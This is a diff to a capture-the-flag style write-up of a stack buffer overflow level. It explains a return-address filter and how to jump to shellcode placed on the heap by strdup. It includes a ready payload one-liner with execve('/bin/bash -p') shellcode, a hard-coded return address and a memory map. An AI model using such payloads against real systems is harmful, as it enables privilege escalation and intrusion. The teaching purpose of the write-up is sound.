@@ -73,7 +73,7 @@ It is still possible to find the address of the `system` function in the libc:
 $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
 ```
 
-But the check for the high bits of the return address prevents us from returning to the stack or the libc, since the high ranges `0xb7xxxxxx` are filtered out:
+But the check for the high bits of the return address prevents us from returning to the stack or the libc, since the high ranges `0xbxxxxxxx` are filtered out:
 
 ```bash
 (gdb) run < <(python -c 'print("A"*80 + "\x60\xb0\xe6\xb7")')
@@ -85,7 +85,7 @@ Starting program: /home/user/level2/level2 < <(python -c 'print("A"*80 + "\x60\x
 [Inferior 1 (process 4843) exited with code 01]
 ```
 
-The real strategy here is to inject some shellcode into the buffer, since the address range is not filtered out, and then return to it:
+The real strategy here is to inject some shellcode into the buffer and overflow the RET address to point to the injected shellcode, which is located on the heap since it is returned by `strdup(buffer)`, which is not filtered out by the check for the high bits of the return address:
 
 ```bash
 python -c 'import struct; shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"; print(shellcode + "A"*(80-len(shellcode)) + struct.pack("<I", 0x804a008))' > /tmp/payload
@@ -114,9 +114,27 @@ cd 80           int 0x80          ; SYSCALL : execve(ebx, ecx, edx)
 
 This is a relatively short shellcode that executes `execve("/bin/bash", "-p", NULL)`, which gives us a shell with the `-p` flag, meaning that it will preserve the effective user ID and group ID, allowing us to keep the privileges of the `level2` user.
 
-Additionally, we have to inject some padding to reach 80 bytes and then overwrite the return address with the address of the buffer, which is `0x804a008` in this case, since the buffer is located at `-0x4c(%ebp)` and `ebp` is located at `0x804a054`:
+Additionally, we have to inject some padding to reach 80 bytes and then overwrite the return address with the pointer returned by `strdup(buffer)`, which is `0x804a008` in this case, since strdup allocates memory on the heap which is not filtered out by the check for the high bits of the return address:
 
 ```bash
+Mapped address spaces:
+
+        Start Addr   End Addr       Size     Offset objfile
+         0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
+         0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
+         0x804a000  0x806b000    0x21000        0x0 [heap] < this is where the shellcode will be injected
+        0xb7e2b000 0xb7e2c000     0x1000        0x0 
+        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fd2000 0xb7fd5000     0x3000        0x0 
+        0xb7fd9000 0xb7fdd000     0x4000        0x0 
+        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+```
 
 We then need to inject this shellcode like so:
 
